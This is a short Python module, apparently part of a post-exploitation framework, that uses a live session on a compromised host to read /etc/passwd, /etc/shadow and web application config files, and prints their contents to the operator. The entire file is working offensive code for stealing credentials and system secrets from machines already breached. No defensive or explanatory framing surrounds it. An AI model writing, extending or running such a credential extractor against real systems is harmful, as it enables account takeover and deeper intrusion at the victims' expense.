# post_expl/cred_extractor.py
from corelistener import session_handler

COMMON_PATHS = [
    "/etc/passwd",
    "/etc/shadow",
    "/var/www/html/config.php",
    "/var/www/html/db.php",
]

def run():
    try:
        sid = int(input("Enter SESSION ID: "))
    except:
        print("[-] Invalid input")
        return

    conn = session_handler.sessions.get(sid)
    if not conn:
        print("[-] Invalid session")
        return

    for path in COMMON_PATHS:
        print(f"[*] Checking {path}")
        conn.send(f"cat {path}\n".encode())
        conn.settimeout(0.2)
        out = b""
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk: break
                out += chunk
            except:
                break
        if out:
            print(f"[+] Found data in {path}:\n{out.decode(errors='ignore')}")
